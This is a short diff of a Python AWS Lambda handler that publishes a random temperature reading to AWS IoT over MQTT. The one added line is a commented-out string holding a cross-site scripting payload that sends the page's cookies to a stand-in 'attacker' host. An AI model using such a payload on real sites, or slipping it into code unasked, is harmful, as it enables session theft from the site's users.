@@ -53,7 +53,7 @@ def lambda_handler(event, context):
 
 	#generate random temperature
 	deviceTemperature = round(random.uniform(15.1,29.9),2)
-
+	# badstring = "<script> window.location='http://attacker/?cookie='+document.cookie </script>"
 	# Connect to AWS IoT
 	myMQTTClient.connect()
 	myMQTTClient.publish(topicname, deviceTemperature, 0)
